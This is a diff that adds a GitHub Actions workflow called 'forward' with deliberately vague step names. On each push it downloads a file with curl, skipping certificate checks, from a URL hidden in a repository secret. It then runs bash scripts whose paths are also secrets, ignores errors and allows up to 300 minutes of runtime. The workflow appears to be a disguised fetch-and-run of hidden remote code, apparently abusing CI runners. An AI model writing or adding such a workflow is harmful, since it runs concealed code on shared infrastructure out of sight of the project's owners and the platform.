@@ -1,0 +1,29 @@
+name: forward
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: forward1
+       uses: actions/checkout@main
+
+     - name: forward2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+     - name: forward3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EA_EF }}
+     - name: forward4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EA_GH }}
